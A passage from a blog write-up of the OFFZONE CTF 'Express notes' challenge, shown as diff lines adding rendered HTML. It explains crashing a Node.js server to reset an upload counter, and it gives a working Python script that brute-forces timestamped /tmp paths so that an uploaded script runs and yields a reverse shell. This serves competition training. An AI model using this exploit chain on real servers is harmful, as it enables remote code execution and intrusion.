+    <span class="kr">const</span> <span class="nx">note</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">hgetall</span><span class="p">(</span><span class="sb">`note:</span><span class="si">${</span><span class="nx">nid</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span>
+    <span class="kr">const</span> <span class="nx">resource</span> <span class="o">=</span> <span class="nx">hashcash</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">3</span><span class="p">];</span>
+    <span class="kr">const</span> <span class="nx">sha1</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="s1">&#39;sha1&#39;</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">hashcash</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">sha1</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;000000&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">resource</span> <span class="o">===</span> <span class="nx">note</span><span class="p">.</span><span class="nx">hashcash</span><span class="p">){</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>If we would not send <code>hashcash</code> it would be undefined and would throw an unhandled error.</p>
+<p><figure><a class="lightgallery" href="/2022/08/offzone-express-notes/unhandled-error.png" title="unhandled-error" data-thumbnail="/2022/08/offzone-express-notes/unhandled-error.png" data-sub-html="<h2>Server crash due to an unhandled error</h2><p>unhandled-error</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="unhandled-error.png"
+            data-srcset="/2022/08/offzone-express-notes/unhandled-error.png, unhandled-error.png 1.5x, /2022/08/offzone-express-notes/unhandled-error.png 2x"
+            data-sizes="auto"
+            alt="/2022/08/offzone-express-notes/unhandled-error.png" />
+    </a><figcaption class="image-caption">Server crash due to an unhandled error</figcaption>
+    </figure></p>
+<p>This would effectively reset the counter, setting it to 1.</p>
+<h3 id="exploit">Exploit</h3>
+<p>Awesome! So here&rsquo;s the full exploit chain.</p>
+<ul>
+<li>Create a note and get the note ID,</li>
+<li>Crash the server,</li>
+<li>Upload our script with <code>/notes/:nid/upload</code> to <code>/tmp/tmp-1-$Date.now()</code> path,</li>
+<li>Get the <code>Date</code> header from the upload response and convert it to milliseconds: in our case, it was <code>1661424636000</code>,</li>
+<li>Run the script below and get a reverse shell</li>
+</ul>
+<p><em>exploit.py</em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;express-notes.ctfz.one&#39;</span>
+<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;lang&#39;</span><span class="p">:</span> <span class="s1">&#39;en-US&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;connect.sid&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;session-cookie&gt;&#39;</span>
+<span class="p">}</span>
+
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;Host&#39;</span><span class="p">:</span> <span class="n">HOST</span><span class="p">,</span>
+    <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">run_in_thread</span><span class="p">(</span><span class="n">fn</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="o">*</span><span class="n">k</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">fn</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="n">k</span><span class="p">,</span> <span class="n">kwargs</span><span class="o">=</span><span class="n">kw</span><span class="p">)</span>
+        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">t</span>
+    <span class="k">return</span> <span class="n">run</span>
+
+
+<span class="nd">@run_in_thread</span>
+<span class="k">def</span> <span class="nf">run_brute</span><span class="p">(</span><span class="n">timestamps</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">timestamp</span> <span class="ow">in</span> <span class="n">timestamps</span><span class="p">:</span>
+        <span class="n">brute</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">brute</span><span class="p">(</span><span class="n">timestamp</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;title=test&amp;content=test&amp;fileLoaded=true&amp;file=/tmp/tmp-1-</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">timestamp</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;https://</span><span class="si">%s</span><span class="s1">/notes&#39;</span> <span class="o">%</span> <span class="n">HOST</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">elapsed</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">())</span>
+
+<span class="n">response_time</span> <span class="o">=</span> <span class="mi">1661424636000</span>
+<span class="n">NUM_THREADS</span> <span class="o">=</span> <span class="mi">5</span>
+
+<span class="n">LIMIT</span> <span class="o">=</span> <span class="mi">1000</span> <span class="o">/</span> <span class="n">NUM_THREADS</span>
+<span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">NUM_THREADS</span><span class="p">):</span>
+    <span class="n">start</span> <span class="o">=</span> <span class="n">response_time</span> <span class="o">+</span> <span class="n">LIMIT</span> <span class="o">*</span> <span class="n">n</span>
+    <span class="n">end</span> <span class="o">=</span> <span class="n">start</span> <span class="o">+</span> <span class="n">LIMIT</span>
+    <span class="n">run_brute</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Running the script above, we got a reverse shell connection to our server and got the flag</p>
+<p><figure><a class="lightgallery" href="/2022/08/offzone-express-notes/success.png" title="success" data-thumbnail="/2022/08/offzone-express-notes/success.png" data-sub-html="<h2>CTFZone{B3_C4reful_w1th_F1l3upl04d_L1bs}</h2><p>success</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="success.png"
+            data-srcset="/2022/08/offzone-express-notes/success.png, success.png 1.5x, /2022/08/offzone-express-notes/success.png 2x"
+            data-sizes="auto"
+            alt="/2022/08/offzone-express-notes/success.png" />
+    </a><figcaption class="image-caption">CTFZone{B3_C4reful_w1th_F1l3upl04d_L1bs}</figcaption>
+    </figure></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 28-08-2022</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2022/08/offzone-express-notes/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.xss.am/2022/08/offzone-express-notes/" data-title="Express notes - &#34;OFFZONE&#34; express file upload challenge" data-hashtags="nodejs,express,redis,fileupload"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.xss.am/2022/08/offzone-express-notes/" data-hashtag="nodejs"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://blog.xss.am/2022/08/offzone-express-notes/" data-title="Express notes - &#34;OFFZONE&#34; express file upload challenge"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.xss.am/2022/08/offzone-express-notes/"><i class="fab fa-reddit fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/nodejs/">nodejs</a>,&nbsp;<a href="/tags/express/">express</a>,&nbsp;<a href="/tags/redis/">redis</a>,&nbsp;<a href="/tags/fileupload/">fileupload</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2022/08/offzone-delicious-and-point/" class="prev" rel="prev" title="Delicious and Point - &#34;OFFZONE&#34; prototype pollution challenge"><i class="fas fa-angle-left fa-fw"></i>Delicious and Point - &#34;OFFZONE&#34; prototype pollution challenge</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://xss.am" target="_blank">davwwwx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/twemoji@13.0.0/dist/twemoji.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":70},"comment":{},"data":{"id-1":"/blog.xss.am/","id-2":"/blog.xss.am/"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.f0e4096f68a24e87589ba7942f64874a24befc1ce05399522b0178ac9d3fb20b351b96e095dd6b5bfbe89cb6834a4b3a.js" integrity="sha384-8OQJb2iiTodYm6eUL2SHSiS&#43;/BzgU5lSKwF4rJ0/sgs1G5bgld1rW/vonLaDSks6"></script></body>
+</html>
